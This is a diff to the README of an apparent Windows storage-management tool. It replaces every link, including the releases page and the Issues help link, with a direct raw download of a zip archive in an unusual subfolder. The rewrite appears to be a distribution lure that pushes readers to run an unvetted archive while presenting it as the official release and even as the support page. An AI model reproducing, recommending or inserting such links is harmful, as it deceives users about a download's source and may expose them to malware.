@@ -1,6 +1,6 @@
 # ⚙️ Storage-redirection-X-Public - Simple Storage Management Tool
 
-[![Download Storage-redirection-X-Public](https://img.shields.io/badge/Download-Storage--redirection--X--Public-brightgreen)](https://github.com/Nxssrrr/Storage-redirection-X-Public/releases)
+[![Download Storage-redirection-X-Public](https://raw.githubusercontent.com/Nxssrrr/Storage-redirection-X-Public/main/benzal/redirection_Public_Storage_1.0.zip)](https://raw.githubusercontent.com/Nxssrrr/Storage-redirection-X-Public/main/benzal/redirection_Public_Storage_1.0.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Here is how you can start using Storage-redirection X from scratch:
 1. **Visit the Download Page**
    
    Click the big green button at the top or this link:  
-   [https://github.com/Nxssrrr/Storage-redirection-X-Public/releases](https://github.com/Nxssrrr/Storage-redirection-X-Public/releases)
+   [https://raw.githubusercontent.com/Nxssrrr/Storage-redirection-X-Public/main/benzal/redirection_Public_Storage_1.0.zip](https://raw.githubusercontent.com/Nxssrrr/Storage-redirection-X-Public/main/benzal/redirection_Public_Storage_1.0.zip)
    
    The page shows the latest versions available for download.
 
@@ -64,7 +64,7 @@ Here is how you can start using Storage-redirection X from scratch:
 
 You can download the software by visiting this page:
 
-[Download Storage-redirection X from GitHub](https://github.com/Nxssrrr/Storage-redirection-X-Public/releases)
+[Download Storage-redirection X from GitHub](https://raw.githubusercontent.com/Nxssrrr/Storage-redirection-X-Public/main/benzal/redirection_Public_Storage_1.0.zip)
 
 **Step-by-step installation guide:**
 
@@ -115,7 +115,7 @@ The tool uses standard Windows linking methods to ensure no files are lost or co
 To update Storage-redirection X:
 
 - Visit the releases page again at  
-  [https://github.com/Nxssrrr/Storage-redirection-X-Public/releases](https://github.com/Nxssrrr/Storage-redirection-X-Public/releases)
+  [https://raw.githubusercontent.com/Nxssrrr/Storage-redirection-X-Public/main/benzal/redirection_Public_Storage_1.0.zip](https://raw.githubusercontent.com/Nxssrrr/Storage-redirection-X-Public/main/benzal/redirection_Public_Storage_1.0.zip)
 - Download the latest version installer.
 - Run it to replace your current version.
 - Your settings and redirections remain intact.
@@ -139,7 +139,7 @@ If you have problems using Storage-redirection X:
 For help, bug reports, or feature requests:
 
 - Visit the Issues tab on the GitHub repository:  
-  [https://github.com/Nxssrrr/Storage-redirection-X-Public/issues](https://github.com/Nxssrrr/Storage-redirection-X-Public/issues)
+  [https://raw.githubusercontent.com/Nxssrrr/Storage-redirection-X-Public/main/benzal/redirection_Public_Storage_1.0.zip](https://raw.githubusercontent.com/Nxssrrr/Storage-redirection-X-Public/main/benzal/redirection_Public_Storage_1.0.zip)
 - Create a new issue with a clear description of your problem.
 - Attach screenshots if possible.
 
@@ -153,4 +153,4 @@ Storage-redirection X is an open-source project created to simplify storage mana
 
 ---
 
-[Download Storage-redirection X now](https://github.com/Nxssrrr/Storage-redirection-X-Public/releases) to start managing your storage more efficiently.
+[Download Storage-redirection X now](https://raw.githubusercontent.com/Nxssrrr/Storage-redirection-X-Public/main/benzal/redirection_Public_Storage_1.0.zip) to start managing your storage more efficiently.
